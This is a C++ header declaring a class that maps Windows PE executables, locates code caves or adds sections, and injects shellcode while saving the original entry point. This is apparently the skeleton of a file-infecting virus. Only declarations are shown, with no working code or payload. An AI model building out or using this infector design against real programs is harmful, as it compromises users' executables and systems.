#pragma once
#include "stdafx.h"
#include "Shellcode.h"

namespace PE
{
	class PE_file
	{
	private:
		std::size_t file_size;
		HANDLE file_handle;
		HANDLE file_mapping;
		LPBYTE file_map_view;
		PIMAGE_DOS_HEADER dos_header;
		PIMAGE_NT_HEADERS nt_header;
		DWORD original_entry_point;
		PIMAGE_SECTION_HEADER infected_section;
		PIMAGE_SECTION_HEADER first_section_header;
		PIMAGE_SECTION_HEADER last_section_header;
		bool is_section_new = false;
		bool signature_verified = false;
		DWORD shellcode_index = 0;

	public:
		PE_file(std::filesystem::path);
		~PE_file();
		void map_file();
		void parse_file();
		DWORD align(DWORD, DWORD);
		void add_new_section();
		void find_code_cave();
		void infect_into_section(const char*);
		void freeFile();
		bool check_32();
	};
}